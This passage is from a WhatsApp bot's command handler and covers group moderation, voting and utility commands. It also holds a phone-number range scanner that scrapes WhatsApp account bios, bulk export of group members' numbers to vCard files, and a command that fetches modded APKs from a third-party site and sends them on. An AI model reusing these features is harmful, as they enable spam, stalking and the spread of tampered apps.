                  replygcprexzy(`${command} is disabled`)
               }
            }
            break 
            case 'invite': {
	if (!m.isGroup) return PrexzyStickgroup()
	if (!isBotAdmins) return PrexzyStickBotAdmin()
if (!text) return replygcprexzy(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2349159895444`)
if (text.includes('+')) return replygcprexzy(`Enter the number together without *+*`)
if (isNaN(text)) return replygcprexzy(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await PrexzyVilla.groupInviteCode(group)
      await PrexzyVilla.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcprexzy(` An invite link is sent to the user`) 
}
break
            case 'closetime':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcprexzy('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                replygcprexzy(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    PrexzyVilla.groupSettingUpdate(m.chat, 'announcement')
                    replygcprexzy(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !PrexzyTheCreator) return replygcprexzy(mess.admin)
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcprexzy('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygcprexzy(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    PrexzyVilla.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcprexzy(open)
                }, timer)
                break
            case 'kick':
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await PrexzyVilla.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                replygcprexzy(mess.done)
                break
                case 'idgroup': case 'groupid': {
if (!PrexzyTheCreator) return PrexzyStickOwner()
let getGroups = await PrexzyVilla.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await PrexzyVilla.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcprexzy(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcprexzy(`Provide Number with last number x\n\nExample: ${prefix + command} 234915989544x`)
var inputnumber = text.split(" ")[0]
        
        replygcprexzy(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await PrexzyVilla.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await PrexzyVilla.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Africa/Lagos').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcprexzy(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return PrexzyStickgroup()
if (!(isGroupAdmins || PrexzyTheCreator)) return PrexzyStickAdmin()
prexzybigpp = await PrexzyVilla.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
PrexzyVilla.sendContact(m.chat, participants.map(a => a.id), prexzybigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return PrexzyStickgroup()
if (!(isGroupAdmins || PrexzyTheCreator)) return PrexzyStickAdmin()
let cmiggc = await PrexzyVilla.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcprexzy('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
PrexzyVilla.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return PrexzyStickgroup()
if (!m.mentionedJid[0]) return replygcprexzy('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
PrexzyVilla.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return PrexzyStickgroup()
if (!(isGroupAdmins || PrexzyTheCreator)) return PrexzyStickAdmin()
if (!m.mentionedJid[0]) return replygcprexzy('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
PrexzyVilla.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return PrexzyStickgroup()
                if(!PrexzyTheCreator) return PrexzyStickOwner()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await PrexzyVilla.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                replygcprexzy(mess.done)
                break
            case 'promote':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await PrexzyVilla.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                replygcprexzy(mess.done)
                break
            case 'demote':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await PrexzyVilla.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                replygcprexzy(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (!text) return replygcprexzy('Text ?')
                await PrexzyVilla.groupUpdateSubject(m.chat, text)
                replygcprexzy(mess.done)
                break
                case 'userjid':{
          	if(!PrexzyTheCreator) return PrexzyStickOwner()
        const groupMetadata = m.isGroup ? await PrexzyVilla.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcprexzy(textt)
    }
    break

case 'modapk': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} calculator`);

    try {
        let searchQuery = encodeURIComponent(text);
        let searchUrl = `https://modyolo.com/?s=${searchQuery}`;
        let searchResponse = await fetch(searchUrl);
        let searchHtml = await searchResponse.text();
        let $ = cheerio.load(searchHtml);

        let firstResult = $('.post-title a').attr('href'); // Get the first result link
        if (!firstResult) return replygcprexzy(`❌ No modded APK found for *${text}*`);

        let apkPageResponse = await fetch(firstResult);
        let apkPageHtml = await apkPageResponse.text();
        let $$ = cheerio.load(apkPageHtml);

        let downloadLink = $$('a[href*="/download/"]').attr('href'); // Extract download link
        if (!downloadLink) return replygcprexzy(`❌ APK found, but no direct download link available.`);

        // Fetch the APK file
        let apkResponse = await fetch(downloadLink);
        if (!apkResponse.ok) return replygcprexzy(`❌ Failed to download APK.`);

        let apkBuffer = await apkResponse.buffer();
        let apkFileName = `${text.replace(/\s+/g, '_')}.apk`;
        let apkPath = path.join(__dirname, apkFileName);
        fs.writeFileSync(apkPath, apkBuffer); // Save the APK file

        // Send the APK file
        PrexzyVilla.sendMessage(m.chat, {
            document: fs.readFileSync(apkPath),
            fileName: apkFileName,
            mimetype: 'application/vnd.android.package-archive',
            caption: `📌 *Modded APK: ${text}*\n✅ Downloaded & Sent by QUEEN NYX 👑`
        }, { quoted: m });

        // Cleanup: Delete APK file after sending
        setTimeout(() => {
            fs.unlinkSync(apkPath);
        }, 300000); // Deletes after 60 seconds

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ Error fetching APK. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
    case 'creategc': case 'creategroup': {
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (!args.join(" ")) return replygcprexzy(`Use ${prefix+command} groupname`)
try {
let cret = await PrexzyVilla.groupCreate(args.join(" "), [])
let response = await PrexzyVilla.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
PrexzyVilla.sendMessage(m.chat, { text:teksop, mentions: await PrexzyVilla.parseMention(teksop)}, {quoted:m})
} catch {
	replygcprexzy(`Error`)
	}
}
break
    case 'setbotbio':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (!text) return replygcprexzy(`Where is the text?\nExample: ${prefix + command} Nyx Bot`)
    await PrexzyVilla.updateProfileStatus(text)
    replygcprexzy(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return PrexzyStickgroup()
if (!isAdmins && !PrexzyTheCreator) return PrexzyStickAdmin()
if (!isBotAdmins) return PrexzyStickBotAdmin()
    await PrexzyVilla.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!PrexzyTheCreator) return PrexzyStickOwner()
    await PrexzyVilla.removeProfilePicture(PrexzyVilla.user.id)
    replygcprexzy(`Success in deleting bot's profile picture`)
    }
    break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (!text) return replygcprexzy('Text ?')
                await PrexzyVilla.groupUpdateDescription(m.chat, text)
                replygcprexzy(mess.done)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins) return replygcprexzy(mess.admin)
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (!quoted) return replygcprexzy(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcprexzy(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcprexzy(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await PrexzyVilla.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await PrexzyVilla.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcprexzy(mess.done)
                } else {
                    var memeg = await PrexzyVilla.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcprexzy(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                let me = m.sender
                let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                PrexzyVilla.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'hidetag':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                PrexzyVilla.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'totag':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (!isAdmins) return replygcprexzy(mess.admin)
                if (!m.quoted) return replygcprexzy(`Reply media with caption ${prefix + command}`)
                PrexzyVilla.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'group':
            case 'grup':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (args[0] === 'close') {
                    await PrexzyVilla.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcprexzy(`Success Closing Group`))
                } else if (args[0] === 'open') {
                    await PrexzyVilla.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcprexzy(`Success Opening Group`))
                } else {
                    replygcprexzy(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            break
            case 'editinfo':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (args[0] === 'open') {
                    await PrexzyVilla.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcprexzy(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await PrexzyVilla.groupSettingUpdate(m.chat, 'locked').then((res) => replygcprexzy(`Successfully Closed Edit Group Info`))
                } else {
                    replygcprexzy(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                let response = await PrexzyVilla.groupInviteCode(m.chat)
                PrexzyVilla.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
            break
            case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await PrexzyVilla.fetchStatus(who)
    replygcprexzy(bio.status)
  } catch {
    if (text) return replygcprexzy(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await PrexzyVilla.fetchStatus(who)
      replygcprexzy(bio.status)
    } catch {
      return replygcprexzy(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return PrexzyStickgroup()
            if (m.chat in vote) return replygcprexzy(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcprexzy(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcprexzy(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            PrexzyVilla.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return PrexzyStickgroup()
            if (!(m.chat in vote)) return replygcprexzy(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcprexzy('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            PrexzyVilla.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return PrexzyStickgroup()
            if (!(m.chat in vote)) return replygcprexzy(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcprexzy('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            PrexzyVilla.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return PrexzyStickgroup()
if (!(m.chat in vote)) return replygcprexzy(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${PrexzyVilla.user.id}
`
PrexzyVilla.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return PrexzyStickgroup()
            if (!(m.chat in vote)) return replygcprexzy(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcprexzy('Successfully Deleted Vote Session In This Group')
	    }
            break
break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isAdmins && !isGroupOwner && !PrexzyTheCreator) return PrexzyStickAdmin()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                await PrexzyVilla.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcprexzy(`Reset Success`)
                    })
            break
case 'githubrepo': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} Queen Nyx bot`);

    try {
        let searchQuery = encodeURIComponent(text);
        let searchUrl = `https://api.github.com/search/repositories?q=${searchQuery}&per_page=1`;
        let searchResponse = await fetch(searchUrl);
        let searchData = await searchResponse.json();

        if (!searchData || !searchData.items || searchData.items.length === 0) {
            return replygcprexzy(`❌ No GitHub repository found for *${text}*`);
        }

        let repo = searchData.items[0];
        let repoMessage = `📂 *GitHub Repository Found!* 📂\n\n📌 *Name:* ${repo.name}\n👤 *Owner:* ${repo.owner.login}\n📝 *Description:* ${repo.description || "No description"}\n⭐ *Stars:* ${repo.stargazers_count}\n🍴 *Forks:* ${repo.forks_count}\n🔗 *URL:* ${repo.html_url}\n\nDONE BY QUEEN NYX 👑`;

        replygcprexzy(repoMessage);

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ Error fetching GitHub repository. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'animemovie': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} Your Name`);

    try {
        let searchQuery = encodeURIComponent(text);
        let apiUrl = `https://api.consumet.org/anime/gogoanime/${searchQuery}`;
        let searchResponse = await fetch(apiUrl);
        let searchData = await searchResponse.json();

        if (!searchData || !searchData.results || searchData.results.length === 0) {
            return replygcprexzy(`❌ No anime movie found for *${text}*`);
        }

        let firstResult = searchData.results[0];
        let animeTitle = firstResult.title;
        let animeImage = firstResult.image;
        let animeLink = firstResult.url;

        // Fetching trailer video
        let trailerApi = `https://api.consumet.org/anime/gogoanime/info/${firstResult.id}`;
        let trailerResponse = await fetch(trailerApi);
        let trailerData = await trailerResponse.json();
        
        let trailerUrl = trailerData.trailer || null; // Some movies don't have trailers

        let responseMessage = `🎥 *Anime Full Movie Found!* 🎥\n\n`;
        responseMessage += `📌 *Title:* ${animeTitle}\n`;
        responseMessage += `🔗 *Watch Online:* ${animeLink}\n\n`;
        responseMessage += `DONE BY QUEEN NYX 👑`;

        // If there's a trailer, send it
        if (trailerUrl) {
            PrexzyVilla.sendMessage(m.chat, {
                video: { url: trailerUrl },
                caption: responseMessage
            }, { quoted: m });
        } else {
            PrexzyVilla.sendMessage(m.chat, {
                image: { url: animeImage },
                caption: responseMessage
            }, { quoted: m });
        }

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ Error fetching anime movie. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
            case 'buypremium':
            case 'premiumuser': {
                let teks = `👋\nWant to Buy Premium?Just chat with the owner😉`
                await PrexzyVilla.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'rentbot':
                replygcprexzy(`Type ${prefix}owner and chat him`)
                break
                case 'tqto':
         replygcprexzy(`Thanks to:\nPREXZY(developer script)\nPrecious Ayomide(Inspiration)`)
                break
                case'menulist':
         replygcprexzy(`*MENULIST*\n•.allmenu\n•.downloadmenu\n•.funmenu\n•.aimenu\n•.groupmenu\n•.ownermenu\n•.photooproxymenu\n•.ephoto360menu\n•.animemenu\n•.nsfwmenu\n•.randomphotomenu\n•.randomvideomenu\n•.stickermenu\n•.databasemenu\n•.stalkermenu\n•.bugmenu\n•.othermenu`)
                break
case 'speedtest':
case 'ping': {
    replygcprexzy('*⏳ Running Speed Test... Please wait...*');

    try {
        let test = await speedTest({ acceptLicense: true, acceptGdpr: true });

        let result = `🚀 *SPEED TEST RESULT*\n\n`;
        result += `📡 *Ping:* ${test.ping.latency} ms\n`;
        result += `⬇️ *Download Speed:* ${test.download.bandwidth / 125000} Mbps\n`;
        result += `⬆️ *Upload Speed:* ${test.upload.bandwidth / 125000} Mbps\n`;
        result += `🌍 *Server:* ${test.server.name} (${test.server.location})\n\n`;
        result += `DONE BY QUEEN NYX 👑`;

        replygcprexzy(result);
    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Speed test failed. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break;
            case 'runtime':
                let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`
                PrexzyVilla.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
                case 'mulaiabsen': {
if (!isGroup) return replygcprexzy('Hanya Di Group')
    const chatId = m.chat; 
    const userId = m.sender;

    
    if (absenData[chatId]) {
        throw 'Absen sudah dimulai di obrolan ini!';
    }

   
    absenData[chatId] = {
        admin: userId, 
        participants: [], 
    };

    
    replygcprexzy('Absen telah dimulai! Gunakan perintah *.absen* untuk bergabung dalam absen ini.');
}
break;


case 'absen': {
if (!isGroup) return replygcprexzy('Hanya Di Group')
    const chatId = m.chat; 
    const userId = m.sender; 

   
    if (!absenData[chatId]) {
